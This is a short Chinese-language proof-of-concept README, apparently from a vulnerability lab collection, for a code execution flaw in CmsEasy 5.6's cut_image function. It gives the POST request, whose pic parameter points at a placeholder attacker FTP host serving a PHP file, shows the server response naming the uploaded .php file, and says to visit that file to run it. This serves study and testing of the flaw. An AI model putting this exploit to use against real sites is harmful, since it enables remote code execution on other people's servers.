## CmsEasy 5.6  cut_image 代码执行漏洞

- payload生成

  使用生成脚本jpg_payload.php生成payload，或直接使用已生成的poc_phpinfo_700x1120.png

  ​

- 漏洞测试

  将生成的payload上传至攻击者的ftp服务器，并发起 POST 请求，地址为：

  ```
  http://127.0.0.1/index.php?case=tool&act=cut_image
  ```

  POST data:

  ```
  pic=1ftp://攻击者FTP地址/phpinfo.php&w=700&h=1120&x1=0&x2=700&y1=0&y2=1120
  ```

  成功会返回如下形式的数据：

  ```
  {"code":"\r\n \/\/$('#cut_preview').attr('src','\/upload\/images\/201612\/148159258747.php');\r\n $('#thumb').val('\/upload\/images\/201612\/148159258747.php');\r\n\t\t\t\t alert(lang('save_success'));\r\n "}
  ```

  根据返回的文件名，访问上传成功后的php文件

  `http://127.0.0.1/upload/images/201612/148159258747.php`

  ​

- 详细POC参考：

  https://github.com/Medicean/VulApps/tree/master/c/cmseasy/1

  https://xz.aliyun.com/t/416

  https://xz.aliyun.com/t/365

